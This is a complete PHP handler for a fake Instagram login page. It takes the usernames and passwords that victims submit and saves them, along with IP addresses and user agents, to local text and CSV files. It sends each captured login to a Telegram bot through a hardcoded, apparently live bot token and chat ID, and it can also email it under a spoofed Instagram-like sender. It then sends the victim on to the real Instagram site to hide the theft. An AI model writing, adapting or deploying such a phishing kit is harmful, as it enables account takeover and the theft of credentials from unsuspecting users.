<?php
// Prevent direct access
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: https://www.instagram.com/');
    exit;
}

// === CONFIGURATION ===
// Telegram Bot (https://t.me/BotFather)
$telegram_enabled = true;
$telegram_bot_token = '8390891357:AAGptBpmPfr3X-MXEogr_pK1ql5E83msYDA';
$telegram_chat_id = '6837057860';

// Email Settings (optional)
$email_enabled = false; // Set to true if you want email notifications
$notify_email = 'your-email@example.com';
$email_subject = '🚨 Captured Instagram Credential';

// === END CONFIG ===

// Get form data with validation
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Validate inputs
if (empty($username) || empty($password)) {
    header('Location: index.html?error=1');
    exit;
}

// Gather information
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Prepare message
$message = "📅 Time: $timestamp\n";
$message .= "🌐 IP: $ip\n";
$message .= "👤 Username: $username\n";
$message .= "🔑 Password: $password\n";
$message .= "📱 User Agent: $user_agent\n";

// === 1. SAVE TO LOCAL FILES ===
try {
    // Save to TXT
    $log_entry = "[$timestamp] IP: $ip | Username: $username | Password: $password | UA: $user_agent\n";
    file_put_contents('credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);
    
    // Save to CSV
    $csvFile = fopen('credentials.csv', 'a');
    if ($csvFile) {
        fputcsv($csvFile, [$timestamp, $ip, $username, $password, $user_agent]);
        fclose($csvFile);
    }
} catch (Exception $e) {
    // Silent fail - continue to Telegram notification
}

// === 2. SEND TO TELEGRAM ===
if ($telegram_enabled && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
    $telegram_message = "🔐 *Instagram Login Captured*\n\n" . $message;
    
    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
    
    $post_data = [
        'chat_id' => $telegram_chat_id,
        'text' => $telegram_message,
        'parse_mode' => 'Markdown'
    ];
    
    // Use cURL for better reliability
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Optional: Log Telegram response for debugging
    // file_put_contents('telegram_debug.log', date('Y-m-d H:i:s') . " | HTTP Code: $http_code | Response: $response\n", FILE_APPEND);
}

// === 3. SEND VIA EMAIL (Optional) ===
if ($email_enabled && !empty($notify_email)) {
    $headers = "From: noreply@instagram-local.com\r\n";
    $headers .= "Reply-To: no-reply@instagram-local.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    $full_message = "A new login was captured:\n\n" . $message;
    @mail($notify_email, $email_subject, $full_message, $headers);
}

// === 4. REDIRECT TO REAL INSTAGRAM ===
// Add a small delay to ensure Telegram message is sent
usleep(500000); // 0.5 seconds
header('Location: https://www.instagram.com/');
exit;
?>